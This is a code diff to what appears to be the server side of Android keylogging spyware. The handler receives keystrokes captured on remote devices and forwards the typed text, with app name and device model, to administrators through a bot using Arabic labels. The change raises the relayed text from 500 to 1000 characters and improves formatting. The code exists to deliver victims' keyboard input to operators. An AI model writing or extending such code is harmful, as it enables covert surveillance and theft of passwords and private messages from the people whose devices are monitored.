@@ -1882,23 +1882,30 @@ def _handle_keylog_event(dev, data):
             return
         
         short_id = dev.get('short_id', '?')
+        model = dev.get('model', '?')
         logger.info(f"⌨️ [Keylog] #{short_id} [{package}]: {text[:100]}")
         
         # Get app name
         app_name = _get_app_name(package) if '_get_app_name' in globals() else package
         
         if mdm_bot:
-            display_text = text[:500]
-            if len(text) > 500:
+            display_text = text[:1000]
+            if len(text) > 1000:
                 display_text += "..."
             
+            # ✅ Clean and format the text for better readability
+            display_text = display_text.replace('\n', ' ').replace('\r', '').strip()
+            
             msg = (
-                f"⌨️ <b>تسجيل لوحة المفاتيح</b>\n\n"
-                f"📱 <b>الجهاز:</b> #{short_id}\n"
-                f"📱 <b>التطبيق:</b> {app_name}\n"
-                f"📝 <b>النص:</b>\n"
-                f"<code>{display_text}</code>\n\n"
-                f"🕐 <b>الوقت:</b> {datetime.now(timezone.utc).strftime('%H:%M:%S')}"
+                f"⌨️ <b>تسجيل لوحة المفاتيح</b>\n"
+                f"━━━━━━━━━━━━━━━\n"
+                f"📱 <b>الجهاز:</b> #{short_id} {model}\n"
+                f"📦 <b>التطبيق:</b> {app_name}\n"
+                f"━━━━━━━━━━━━━━━\n"
+                f"📝 <b>النص المكتوب:</b>\n"
+                f"<code>{display_text}</code>\n"
+                f"━━━━━━━━━━━━━━━\n"
+                f"🕐 {datetime.now(timezone.utc).strftime('%H:%M:%S')}"
             )
             
             for admin_id in Config.ADMIN_IDS:
